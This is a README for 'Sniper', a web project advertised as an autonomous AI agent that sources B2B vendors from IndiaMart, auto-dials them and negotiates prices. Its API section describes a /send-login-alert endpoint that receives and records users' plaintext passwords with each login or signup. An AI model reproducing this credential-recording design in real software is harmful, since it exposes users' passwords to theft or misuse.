# Sniper — B2B AI Sourcing Agent

> Find, call, and close B2B deals automatically.

Sniper is an AI-powered procurement agent that crawls IndiaMart, verifies GST numbers, auto-dials vendors, and negotiates the best price — all without human intervention.

---

## Pages

| Page | Description |
|---|---|
| `/` | Landing page with live sourcing demo |
| `/login.html` | User login |
| `/signup.html` | User registration |
| `/dashboard.html` | Post-auth dashboard |

---

## Tech Stack

- **Frontend** — Pure HTML5, Tailwind CSS (CDN), Vanilla JavaScript
- **Backend** — Node.js (zero dependencies, built-in `http` module)
- **Auth flow** — Email + password with client-side validation
- **Styling** — Custom CSS animations, Inter font, orange brand palette

---

## Getting Started

### Prerequisites
- Node.js ≥ 18

### Run locally

```bash
# Clone the repo
git clone https://github.com/Shivinazad/B2B-call-automater-1.0.git
cd B2B-call-automater-1.0

# Start the server
node server.js
```

Open **http://localhost:3000** in your browser.

---

## Project Structure

```
├── index.html        # Landing page
├── login.html        # Login page
├── signup.html       # Signup page
├── dashboard.html    # User dashboard
├── server.js         # Node.js HTTP server + API
├── style.css         # Global styles & animations
├── script.js         # Client-side JS (log feed, reveal animations)
└── package.json      # Project metadata
```

---

## API

### `POST /send-login-alert`

Records a login or signup event.

**Request body**
```json
{
  "email": "user@example.com",
  "password": "••••••••",
  "type": "LOGIN" | "SIGNUP"
}
```

**Response**
```json
{ "success": true, "message": "SIGNUP recorded." }
```

---

## Features

- **Autonomous Activity Log** — real-time feed of agent actions
- **Live Deal Counter** — shows savings negotiated in ₹
- **Vendor Verification** — GSTIN validation against IndiaMart data
- **Pan-India Coverage** — 45+ manufacturing hubs (Ludhiana, Surat, Tiruppur, …)
- **Cookie consent banner** — GDPR-style accept/reject UI
- **Scroll reveal animations** — Intersection Observer based transitions

---

## License

MIT
